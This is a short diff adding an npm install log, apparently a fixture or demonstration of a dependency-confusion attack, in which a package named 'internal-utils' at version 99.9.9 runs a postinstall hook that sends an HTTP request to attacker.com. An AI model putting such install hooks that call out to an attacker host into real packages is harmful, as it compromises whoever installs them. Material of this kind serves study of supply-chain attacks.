@@ -1,0 +1,8 @@
+npm warn internal-utils@99.9.9 No description
+npm warn internal-utils@99.9.9 No repository field.
+
+> internal-utils@99.9.9 postinstall /app/node_modules/internal-utils
+> node -e "require('http').get('http://attacker.com/pwned')"
+
++ internal-utils@99.9.9
+added 1 package from 2 contributors in 1.45s
